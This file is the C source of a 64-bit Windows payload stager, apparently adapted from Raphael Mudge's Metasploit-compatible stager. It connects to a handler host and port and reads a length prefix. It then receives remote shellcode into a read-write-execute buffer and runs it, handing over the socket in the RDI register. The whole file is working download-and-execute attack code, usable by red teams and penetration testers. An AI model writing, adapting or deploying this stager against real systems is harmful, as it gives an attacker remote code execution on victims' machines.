/*
 *
 * @author Raphael Mudge (raffi@strategiccyber.com)
 * Barkin KILIC barkin.kilic@bga.com.tr) @barknkilic
 * @license BSD License.
 * Thanks to Murat KOC for helping about cross compile @muratkochane
 *
 * Changed the size of variables for 64bit, optimized Virtualalloc for 64bit and also changed the size of buffers
 */

 #include <stdio.h>
 #include <stdlib.h>
 #include <stdint.h>
 #include <winsock2.h>
 #include <windows.h>
 
 /* init winsock */
 void winsock_init() {
 
 
 WSADATA	wsaData;
 
 
 WORD wVersionRequested;
 
 
 
 wVersionRequested = MAKEWORD(2, 2);
 
 
 
 if (WSAStartup(wVersionRequested, &wsaData) < 0) {
 
 
 printf("ws2_32.dll is out of date.\n");
 
 
 WSACleanup();
 
 
 exit(1);
 
 
 }
 }
 
 /* a quick routine to quit and report why we quit */
 void punt(SOCKET my_socket, char * error) {
 
 
 printf("Hata kodu(Error code): %i\n",GetLastError()); 

 printf("Bad things: %s\n", error);
 
 
 closesocket(my_socket);
 
 
 WSACleanup();
 
 
 exit(1);
 
 
 }
 
 /* attempt to receive all of the requested data from the socket */
 
 
 int64_t recv_all(SOCKET my_socket, void * buffer, int64_t len) {
 
 
 int64_t tret = 0;
 
 
 int64_t nret = 0;
 
 
 void * startb = buffer;
 
 
 while (tret < len) {
 
 
 nret = recv(my_socket, (char *)startb, len - tret, 0);
 
 
 startb += nret;
 
 
 tret += nret;
 
 
 
 if (nret == SOCKET_ERROR)
 
 
 punt(my_socket, "Could not receive data");
 
 
 }
 return tret;
 
 
 }
 
 /* establish a connection to a host:port */
 
 
 SOCKET wsconnect(char * targetip, int port) {
 
 
 struct hostent *	target;
 
 
 struct sockaddr_in sock;
 
 
 SOCKET my_socket;
 
 
 
 /* setup our socket */
 
 
 my_socket = socket(AF_INET, SOCK_STREAM, 0);
 
 
 if (my_socket == INVALID_SOCKET)
 
 
 punt(my_socket, "Could not initialize socket");
 
 
 
 /* resolve our target */
 
 
 target = gethostbyname(targetip);
 
 
 if (target == NULL)
 
 
 punt(my_socket, "Could not resolve target");
 
 
 
 
 /* copy our target information into the sock */
 memcpy(&sock.sin_addr.s_addr, target->h_addr, target->h_length);
 
 
 sock.sin_family = AF_INET;
 
 
 sock.sin_port = htons(port);
 
 
 
 /* attempt to connect */
 
 
 if ( connect(my_socket, (struct sockaddr *)&sock, sizeof(sock)) )
 
 
 punt(my_socket, "Could not connect to target");
 
 
 
 return my_socket;
 
 
 }
 
 
 int64_t main(int argc, char * argv[]) {
 
 
 ULONG64 size;
 
 
 char * buffer;
 
 
 void (*function)();
 
 
 
 winsock_init();
 
 
 
 if (argc != 3) {
 
 
 printf("%s [host] [port]\n", argv[0]);
 
 
 exit(1);
 
 
 }
 
 /* connect to the handler */
 
 
 SOCKET my_socket = wsconnect(argv[1], atoi(argv[2]));
 
 
 
 /* read the 4-byte length */
 
 
 int64_t count = recv(my_socket, (char *)&size, 4, 0);
 
 
 if (count != 4 || size <= 0)
 
 
 punt(my_socket, "read a strange or incomplete length value\n");
 
 //printf("Okunan (Read): %i bytes\n",size); 
 
 /* allocate a RWX buffer */
const size_t pageSize = size + 10; 
DWORD flags = MEM_COMMIT | MEM_RESERVE;
 
 buffer = VirtualAlloc(NULL, pageSize, flags, PAGE_EXECUTE_READWRITE);
 
//printf("Adres (Address): %x\n",buffer); 
 
 if (buffer == NULL)
 
 punt(my_socket, "could not allocate buffer\n");
 
 
 /* prepend a little assembly to move our SOCKET value to the EDI register
 
 
 thanks mihi for pointing this out
 
 
 BF 78 56 34 12 => mov edi, 0x12345678 
 48 BF 78 56 34 12 00 00 00 00  =>   mov rdi, 0x12345678 */ 
 
 buffer[0] = 0x48;
 buffer[1] = 0xBF;
 
 
 
 /* copy the value of our socket to the buffer */
 
 
 memcpy(buffer + 2, &my_socket, 4);
 
 
 
 /* read bytes into the buffer */
 
 
 count = recv_all(my_socket, buffer + 10, size);
 
 
 
 /* cast our buffer as a function and call it */
 
 
 function = (void (*)())buffer;
 
 
 function();
 
 
 
 return 0;
 }
